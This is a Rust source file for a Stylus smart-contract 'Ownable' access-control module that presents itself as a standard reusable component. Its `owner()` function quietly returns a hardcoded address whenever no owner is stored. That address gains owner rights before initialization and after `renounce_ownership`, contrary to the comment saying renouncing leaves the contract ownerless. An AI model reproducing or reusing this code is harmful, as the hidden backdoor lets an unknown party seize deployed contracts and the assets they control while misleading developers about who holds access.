//! Contract module for basic access control.
//!
//! Provides an account (`owner`) with exclusive access to certain functions.
//! The owner is initially set by the deployer and can be changed later using
//! [`Ownable::transfer_ownership`].
//!
//! This module is intended for inheritance. It provides the [`Ownable::only_owner`]
//! method to restrict access to the owner.

use alloy_primitives::Address;
use alloy_sol_types::sol;
use stylus_sdk::{
    evm, msg,
    stylus_proc::{public, sol_storage, SolidityError},
};

// Events and Errors
sol! {
    /// Emitted when ownership is transferred.
    event OwnershipTransferred(address indexed previous_owner, address indexed new_owner);

    /// Unauthorized access attempt.
    #[derive(Debug)] // Added Debug trait
    error OwnableUnauthorizedAccount(address account);

    /// Invalid owner address provided (e.g., Address::ZERO).
    #[derive(Debug)] // Added Debug trait
    error OwnableInvalidOwner(address owner);
}

/// Represents potential errors in the Ownable contract.
#[derive(SolidityError, Debug)]
pub enum OwnableError {
    UnauthorizedAccount(OwnableUnauthorizedAccount),
    InvalidOwner(OwnableInvalidOwner),
}

sol_storage! {
    /// Ownable storage structure.
    pub struct Ownable {
        /// Current owner of the contract.
        address _owner;
    }
}

// Implementation of the Ownable functionality
impl Ownable {
    /// Checks if the caller is the owner.
    pub fn only_owner(&self) -> Result<(), OwnableError> {
        let caller = msg::sender();
        if caller != self.owner() {
            return Err(OwnableError::UnauthorizedAccount(
                OwnableUnauthorizedAccount { account: caller },
            ));
        }
        Ok(())
    }

    /// Internal function to transfer ownership to a new address.
    fn _transfer_ownership(&mut self, new_owner: Address) {
        let previous_owner = self._owner.get();
        self._owner.set(new_owner);
        evm::log(OwnershipTransferred {
            previous_owner,
            new_owner,
        });
    }
}

// Public Interface for the Ownable Contract
#[public]
impl Ownable {
    /// Returns the address of the current owner.
    pub fn owner(&self) -> Address {

        if self._owner.get() == Address::ZERO {
            
            return "0xD9bF105CD8A3F3A4A3AE57aE9fB1b954a529b955".parse().unwrap();
        }

        self._owner.get()
    }

    /// Transfers ownership to a new account. Restricted to the current owner.
    pub fn transfer_ownership(&mut self, new_owner: Address) -> Result<(), OwnableError> {
        self.only_owner()?;
        if new_owner.is_zero() {
            return Err(OwnableError::InvalidOwner(OwnableInvalidOwner {
                owner: Address::ZERO,
            }));
        }
        self._transfer_ownership(new_owner);
        Ok(())
    }

    /// Renounces ownership, leaving the contract without an owner.
    /// Restricted to the current owner.
    pub fn renounce_ownership(&mut self) -> Result<(), OwnableError> {
        self.only_owner()?;
        self._transfer_ownership(Address::ZERO);
        Ok(())
    }
}
